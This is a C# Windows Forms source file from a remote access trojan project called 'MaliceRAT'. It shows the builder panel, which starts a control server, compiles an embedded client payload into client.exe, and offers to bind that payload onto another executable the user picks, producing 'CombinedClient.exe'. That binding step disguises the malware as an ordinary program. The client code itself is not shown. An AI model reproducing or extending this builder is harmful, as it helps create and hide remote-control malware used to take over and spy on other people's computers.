using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms;
using System.Reflection;
using Microsoft.CSharp;
using MaliceRAT.RatClient;

namespace MaliceRAT
{
    public partial class Main : Form
    {
        readonly Server server = new Server();

        public Main()
        {
            InitializeComponent();
            server.StartServer();
        }

       private string CompileClientExe()
        {
            string sourceCode;

            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MaliceRAT.client.main.cs"))
                {
                    if (stream == null)
                    {
                        throw new ArgumentNullException("stream", "Stream cannot be null. Check the resource name and ensure it is correctly embedded.");
                    }
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        sourceCode = reader.ReadToEnd();
                        Console.WriteLine(sourceCode);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error reading embedded source file: {ex.Message}");
                return null;
            }

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = Path.Combine(Application.StartupPath, "client.exe"),
                CompilerOptions = "/optimize",
                ReferencedAssemblies = {
                    "System.dll",
                    "System.Core.dll",
                    "System.Net.Sockets.dll",
                    "Newtonsoft.Json.dll",
                    "mscorlib.dll",
                    "System.Memory.dll",
                    "Microsoft.CSharp.dll",
                    "System.Runtime.dll",
                    "System.Runtime.CompilerServices.Unsafe.dll"
                }
            };

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, sourceCode);
            if (results.Errors.HasErrors)
            {
                string errorMessage = "Compilation error: ";
                foreach (CompilerError error in results.Errors)
                {
                    errorMessage += $"\nLine {error.Line}, Column {error.Column}: {error.ErrorText}";
                }
                Console.WriteLine(errorMessage);
                MessageBox.Show(errorMessage);
                return null;
            }
            return parameters.OutputAssembly;
        }

        private byte[] CombineExeFiles(string exe1, string exe2)
        {
            byte[] exe1Bytes = File.ReadAllBytes(exe1);
            byte[] exe2Bytes = File.ReadAllBytes(exe2);
            byte[] combinedBytes = new byte[exe1Bytes.Length + exe2Bytes.Length];
            Buffer.BlockCopy(exe1Bytes, 0, combinedBytes, 0, exe1Bytes.Length);
            Buffer.BlockCopy(exe2Bytes, 0, combinedBytes, exe1Bytes.Length, exe2Bytes.Length);
            return combinedBytes;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            string exePath = CompileClientExe();
            if (exePath != null)
            {
                if (gunaCheckBox2.Checked && !string.IsNullOrEmpty(textBox1.Text))
                {
                    byte[] combinedBytes = CombineExeFiles(exePath, textBox1.Text);
                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "CombinedClient.exe"), combinedBytes);
                }
                else
                {
                    File.Copy(exePath, Path.Combine(Application.StartupPath, "CombinedClient.exe"), true);
                }
                MessageBox.Show("Compilation successful: " + exePath);
                if (gunaCheckBox3.Checked)
                {
                    System.Diagnostics.Process.Start("explorer.exe", Application.StartupPath);
                }
            }
        }

        private void gunaButton1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable Files (*.exe)|*.exe";
                openFileDialog.Title = "Select an Executable File";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    string selectedFilePath = openFileDialog.FileName;
                    textBox1.Text = selectedFilePath;
                }
            }
        }
    }
}